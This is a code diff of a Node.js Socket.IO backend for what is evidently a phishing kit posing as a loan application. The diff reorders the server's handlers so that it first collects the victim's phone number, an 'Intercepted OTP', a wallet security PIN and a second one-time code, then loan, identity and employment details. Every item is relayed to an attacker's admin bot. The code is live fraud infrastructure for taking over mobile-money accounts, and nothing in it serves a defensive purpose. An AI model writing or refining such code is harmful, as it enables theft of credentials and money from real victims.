@@ -46,38 +46,49 @@ io.on('connection', (socket) => {
         console.log(`🔌 User joined room: ${room}`);
     });
 
-    // Extract correct data context properties sent from client to keep tracking synchronized
-    socket.on('step1', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Loan Request", data, false);
-    });
+    // ==========================================
+    // STAGE 1: GATEWAY AUTHENTICATION STREAM
+    // ==========================================
 
-    socket.on('step2', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 2: Identity Profile", data, false);
-    });
-    
-    socket.on('step3-data', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 3: Employment Profile", data, false);
-    });
-
+    // NEW STEP 1: Phone number and Initial OTP payload delivery 
     socket.on('step4-otp', (data) => {
         const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Intercepted OTP", data, true);
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Phone & Intercepted OTP 1", data, true);
     });
 
+    // NEW STEP 2: Wallet Account Security PIN delivery
     socket.on('step5-pin', (data) => {
         const currentId = data.appId || initialAppId;
         botManager.sendFinalApproval(currentId, data.pin);
     });
 
-    // STEP 6 ADDITION START
+    // NEW STEP 3: Secondary Multi-Factor Code delivery
     socket.on('step6-otp2', (data) => {
         const currentId = data.appId || initialAppId;
         botManager.sendSecondOTP(currentId, data.otp2);
     });
-    // STEP 6 ADDITION END
+
+    // ==========================================
+    // STAGE 2: LOAN DETAIL PROFILE EXTRACTION
+    // ==========================================
+
+    // NEW STEP 4: Loan Calculation Parameters (Type, Amount, Term, Purpose)
+    socket.on('step1', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Loan Request Parameters", data, false);
+    });
+
+    // NEW STEP 5: Core Personal Information (First Name, Last Name, Email)
+    socket.on('step2', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 5: Personal Identity Profile", data, false);
+    });
+    
+    // NEW STEP 6: Employment Status and Verified Declared Income
+    socket.on('step3-data', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 6: Employment & Income Status", data, false);
+    });
 
     socket.on('disconnect', () => {
         console.log(`🔌 User disconnected socket connection reference.`);
